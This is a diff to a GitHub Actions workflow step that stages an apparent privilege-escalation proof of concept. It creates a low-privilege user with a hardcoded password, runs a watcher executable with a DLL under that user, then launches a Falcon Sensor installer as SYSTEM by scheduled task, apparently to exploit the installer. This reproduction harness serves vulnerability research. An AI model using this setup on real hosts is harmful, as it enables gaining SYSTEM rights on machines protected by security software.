@@ -25,10 +25,27 @@ jobs:
           "POC_DRIVE=$drive" | Out-File -FilePath $env:GITHUB_ENV -Append
           Write-Host "Mounted $drive`:"
       - name: Run low-privilege watcher and exact installer as SYSTEM
-        shell: cmd
+        shell: pwsh
         run: |
-          call %POC_DRIVE%:\run-system.cmd
-          timeout /t 35 /nobreak
+          $ErrorActionPreference='Stop'
+          New-Item -ItemType Directory -Force C:\poc\readonly,C:\poc\results | Out-Null
+          Copy-Item "$env:POC_DRIVE`:\watcher.exe" C:\poc\readonly\watcher.exe -Force
+          Copy-Item "$env:POC_DRIVE`:\fgba.dll" C:\poc\readonly\fgba.dll -Force
+          Copy-Item "$env:POC_DRIVE`:\FalconSensor_Windows_7.40.21306_GovLaggar.exe" C:\poc\readonly\FalconSensor.exe -Force
+          cmd /c 'icacls C:\poc /inheritance:r /grant:r SYSTEM:(OI)(CI)F Administrators:(OI)(CI)F Users:(OI)(CI)RX'
+          cmd /c 'icacls C:\poc\results /grant:r Users:(OI)(CI)M'
+          $pw='Burn-PoC-2026!'
+          net user burnlow $pw /add
+          net localgroup Administrators burnlow /delete 2>$null
+          $lowAction=New-ScheduledTaskAction -Execute 'C:\poc\readonly\watcher.exe' -Argument 'C:\poc\readonly\fgba.dll'
+          $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
+          Register-ScheduledTask -TaskName BurnLowWatcher -Action $lowAction -Trigger $trigger -User "$env:COMPUTERNAME\burnlow" -Password $pw -RunLevel Limited -Force | Out-Null
+          Start-ScheduledTask -TaskName BurnLowWatcher
+          Start-Sleep -Seconds 3
+          $sysAction=New-ScheduledTaskAction -Execute 'C:\poc\readonly\FalconSensor.exe' -Argument '/help'
+          Register-ScheduledTask -TaskName BurnSystemInstaller -Action $sysAction -Trigger $trigger -User 'SYSTEM' -RunLevel Highest -Force | Out-Null
+          Start-ScheduledTask -TaskName BurnSystemInstaller
+          Start-Sleep -Seconds 45
       - name: Collect proof
         if: always()
         shell: pwsh
